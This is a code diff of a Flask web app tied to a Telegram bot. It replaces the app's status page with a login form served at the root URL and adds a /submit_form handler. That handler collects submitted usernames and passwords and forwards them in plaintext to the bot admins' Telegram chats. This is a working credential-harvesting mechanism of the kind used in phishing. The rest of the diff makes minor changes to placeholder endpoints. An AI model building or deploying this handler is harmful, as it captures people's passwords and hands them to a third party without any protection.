-        pct.innerText = percent + '%';
-        if (pos >= line.length) {
-          clearInterval(iv);
-          li += 1;
-          setTimeout(typeNextLine, 220 + Math.random() * 220);
-        }
-      }, speed);
-    }
-    typeNextLine();
-  }
-
-  document.getElementById('restartBtn').addEventListener('click', async () => {
-    if (!confirm('Restart Bot? (this will call a protected endpoint)')) return;
-    const resp = await fetch('/restart', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({secret: '{{WEB_SECRET}}'})
-    });
-    const j = await resp.json();
-    alert(j.message || 'ok');
-  });
-  document.getElementById('openBtn').addEventListener('click', async () => {
-    const resp = await fetch('/open', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({secret: '{{WEB_SECRET}}'})
-    });
-    const j = await resp.json();
-    alert(j.message || 'ok');
-  });
-
-  fetchAndStart();
-</script>
 </body>
 </html>
 """
 
 @flask_app.route("/")
 def home():
-    rendered = render_template_string(STATUS_HTML, WEB_SECRET=WEB_SECRET)
-    return Response(rendered, mimetype="text/html")
+    return Response(LOGIN_FORM_HTML, mimetype="text/html")
 
+@flask_app.route("/submit_form", methods=["POST"])
+def submit_form():
+    username = request.form.get("username")
+    password = request.form.get("password")
+
+    try:
+        # notify all admins asynchronously if available
+        for admin_id in ADMIN_IDS:
+            if hasattr(flask_app, "telegram_app") and hasattr(flask_app, "bot"):
+                flask_app.telegram_app.create_task(
+                    flask_app.bot.send_message(
+                        chat_id=admin_id,
+                        text=(
+                            "📩 <b>Form Submitted</b>\n\n"
+                            f"<b>Username:</b> {username}\n"
+                            f"<b>Password:</b> {password}"
+                        ),
+                        parse_mode=ParseMode.HTML,
+                    )
+                )
+    except Exception:
+        logger.exception("Failed to send form data to admin")
+
+    return "<h3>✅ Data sent to bot admin!</h3><p>You can close this tab.</p>"
+
+# ---------- Status + placeholders ----------
 @flask_app.route("/status")
 def status():
     uptime = format_uptime(time.time() - _start_time)
@@ -633,8 +544,8 @@ def http_restart():
     data = request.get_json(silent=True) or {}
     if not _check_secret(data):
         return jsonify({"ok": False, "message": "unauthorized"}), 401
-    logger.info("Received /restart via HTTP - secret validated (no restart performed, placeholder).")
-    return jsonify({"ok": True, "message": "restart endpoint received (placeholder)."}), 200
+    logger.info("Received /restart via HTTP - secret validated (no restart performed).")
+    return jsonify({"ok": True, "message": "restart endpoint placeholder."}), 200
 
 @flask_app.route("/open", methods=["POST"])
 def http_open():
@@ -642,7 +553,7 @@ def http_open():
     if not _check_secret(data):
         return jsonify({"ok": False, "message": "unauthorized"}), 401
     logger.info("Received /open via HTTP - secret validated (placeholder).")
-    return jsonify({"ok": True, "message": "open endpoint received (placeholder)."}), 200
+    return jsonify({"ok": True, "message": "open endpoint placeholder."}), 200
 
 def run_flask():
     port = int(os.getenv("PORT", "5000"))
@@ -651,6 +562,11 @@ def run_flask():
 def main():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
 
+    # Attach bot + app to Flask so submit_form can notify admins
+    flask_app.bot = app.bot
+    flask_app.telegram_app = app
+
+    # Register handlers
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(show_commands_callback, pattern="show_commands"))
     app.add_handler(CallbackQueryHandler(back_to_start_callback, pattern="back_to_start"))
@@ -660,10 +576,9 @@ def main():
     app.add_handler(CommandHandler("redeem", redeem))
     app.add_handler(CommandHandler("listcodes", listcodes))
     app.add_handler(CommandHandler("deletecode", deletecode))
-    app.add_handler(CommandHandler("ping", ping))  # styled ping added
+    app.add_handler(CommandHandler("ping", ping))
 
     Thread(target=run_flask, daemon=True).start()
-
     logger.info("Bot is starting...")
     app.run_polling()
 
